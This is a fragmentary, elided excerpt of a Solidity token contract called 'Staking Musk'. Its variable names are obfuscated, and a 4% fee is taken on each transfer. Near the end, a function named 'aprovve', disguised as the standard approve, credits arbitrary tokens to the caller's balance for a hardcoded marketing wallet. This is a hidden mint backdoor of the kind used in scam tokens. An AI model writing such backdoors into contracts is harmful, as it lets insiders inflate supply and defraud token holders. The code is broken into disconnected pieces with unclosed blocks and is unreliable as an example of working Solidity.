...
contract Context {
 ...
 contract StakingMusk is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloSTAKING;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Staking Musk";
    string private _symbol = "STAKINGMUSK";
    ...
    uint256 private cryfaleSTAKING = 4;
    uint256 private _vebegoSTAKING = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloSTAKING[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletSTAKING = 0x2295543A7310B0d735e045ea81B0475Af32F6C22;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloSTAKING[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloSTAKING[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleSTAKING / 100) / _vebegoSTAKING;
        allons = allons -  (_fee * _vebegoSTAKING);
        
        superfloSTAKING[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaSTAKING) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloSTAKING[account];
        require(accountBalance >= gzillaSTAKING, "BEP : Can't be done");
        unchecked {
            superfloSTAKING[account] = accountBalance - gzillaSTAKING;
        }
        _totalSupply -= gzillaSTAKING;

        emit Transfer(account, address(0), gzillaSTAKING);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloSTAKING[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletSTAKING, "ERC20: cannot permit dev address");
    }   
